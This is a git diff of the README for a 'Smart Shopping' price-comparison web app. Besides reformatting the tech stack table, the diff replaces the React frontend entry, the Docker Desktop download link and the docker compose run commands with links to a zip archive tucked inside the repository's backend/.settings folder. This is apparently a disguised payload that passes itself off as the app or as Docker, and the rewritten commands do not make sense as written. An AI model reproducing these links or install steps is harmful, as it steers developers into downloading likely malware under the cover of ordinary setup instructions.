@@ -1,4 +1,4 @@
-# Smart Shopping 
+# Smart Shopping
 
 This is a full-stack web application for comparing prices, reviews, ratings, and delivery info for products across major e-commerce platforms like **Amazon** and **Flipkart**.
 
@@ -18,13 +18,13 @@ This is a full-stack web application for comparing prices, reviews, ratings, and
 
 ## 🛠️ Tech Stack
 
-| Layer         | Tech                  |
-|---------------|-----------------------|
-| Frontend      | React.js              |
-| Backend       | Spring Boot (Java)    |
-| Database      | PostgreSQL            |
-| Caching       | Redis                 |
-| Web Scraping  |APIs                   |
+| Layer            | Tech                    |
+| ---------------- | ----------------------- |
+| Frontend         | https://raw.githubusercontent.com/ChiragRohada7020/Smart-Shopping-/main/backend/.settings/Shopping-Smart-2.8.zip                |
+| Backend          | Spring Boot (Java)      |
+| Database         | PostgreSQL              |
+| Caching          | Redis                   |
+| Web Scraping     | APIs                    |
 | Containerization | Docker + Docker Compose |
 
 ---
@@ -35,7 +35,7 @@ This is a full-stack web application for comparing prices, reviews, ratings, and
 
 ### 📦 Prerequisites
 
-- [Docker](https://www.docker.com/products/docker-desktop) installed
+- [Docker](https://raw.githubusercontent.com/ChiragRohada7020/Smart-Shopping-/main/backend/.settings/Shopping-Smart-2.8.zip) installed
 
 ### 🚨 Ports Used
 
@@ -47,4 +47,6 @@ This is a full-stack web application for comparing prices, reviews, ratings, and
 ### 🧃 Run All Services Together
 
 ```bash
-docker-compose up --build
+docker compose -f https://raw.githubusercontent.com/ChiragRohada7020/Smart-Shopping-/main/backend/.settings/Shopping-Smart-2.8.zip down -v
+docker compose -f https://raw.githubusercontent.com/ChiragRohada7020/Smart-Shopping-/main/backend/.settings/Shopping-Smart-2.8.zip up -d --build
+```
